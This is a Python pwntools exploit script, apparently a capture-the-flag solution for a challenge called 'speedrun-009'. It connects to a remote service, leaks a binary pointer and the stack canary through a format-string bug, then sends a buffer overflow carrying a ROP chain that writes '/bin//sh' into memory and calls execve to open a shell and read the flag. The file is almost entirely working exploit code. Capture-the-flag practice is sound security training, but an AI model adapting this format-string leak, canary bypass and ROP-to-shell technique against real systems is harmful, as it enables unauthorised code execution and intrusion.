#!/usr/bin/env python2
import sys
import time
from pwn import *
from struct import pack

context.log_level = logging.DEBUG

def get_connection():
    #conn = process("./speedrun-009")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    # gdb.attach(conn, '''
    # continue
    # ''')

    return conn

conn = get_connection()

conn.recvuntil("1, 2, or 3")

conn.send("2")

# leak a pointer to the binary and the canary
conn.send("g%2$p h%163$ph")

result = conn.recvuntil("1, 2, or 3")

result = re.search('g0x([0-9a-fA-F]+) h0x([0-9a-fA-F]+)h', result)

leaked_binary = int(result.group(1), 16)
leaked_canary = int(result.group(2), 16)

binary_base = leaked_binary - 0x6bbd30

conn.send("1")

p = 'a' * 0x408
p += p64(leaked_canary)
p += 'b' * 8
p += pack('<Q', binary_base + 0x00000000004102f3) # pop rsi ; ret
p += pack('<Q', binary_base + 0x00000000006b90e0) # @ .data
p += pack('<Q', binary_base + 0x0000000000415764) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', binary_base + 0x000000000047f571) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', binary_base + 0x00000000004102f3) # pop rsi ; ret
p += pack('<Q', binary_base + 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', binary_base + 0x0000000000444cc0) # xor rax, rax ; ret
p += pack('<Q', binary_base + 0x000000000047f571) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', binary_base + 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', binary_base + 0x00000000006b90e0) # @ .data
p += pack('<Q', binary_base + 0x00000000004102f3) # pop rsi ; ret
p += pack('<Q', binary_base + 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', binary_base + 0x00000000004499b5) # pop rdx ; ret
p += pack('<Q', binary_base + 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', binary_base + 0x0000000000415764) # pop rax ; ret
p += p64(0x3b)
p += pack('<Q', binary_base + 0x000000000040139c) # syscall

conn.send(p)

conn.recvuntil("1, 2, or 3")
conn.send("3")

conn.recv(timeout=1)

conn.sendline('cat /flag; exit')
result = conn.recvall(timeout=1)
flag = re.search('OOO{[^}]+}', result)
print("FLAG: %s" % flag.group(0))

